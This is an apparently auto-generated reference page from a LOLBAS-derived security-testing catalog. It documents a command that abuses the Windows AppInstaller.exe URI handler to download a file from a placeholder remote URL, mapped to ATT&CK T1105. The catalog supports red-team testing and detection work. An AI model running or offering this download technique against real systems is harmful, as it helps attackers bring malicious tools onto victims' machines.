---
parsed_by: focuslocust
source: commands
type: generated
---
# AppInstaller Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## AppInstaller.exe

Tool page: [AppInstaller.exe](../../tools/windows/appinstaller.exe.md)

### Download file from Internet

```text
start ms-appinstaller://?source={REMOTEURL:.exe}
```

Description:

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/AppInstaller.yml` |
| Evidence | Command preserved from source parser. |
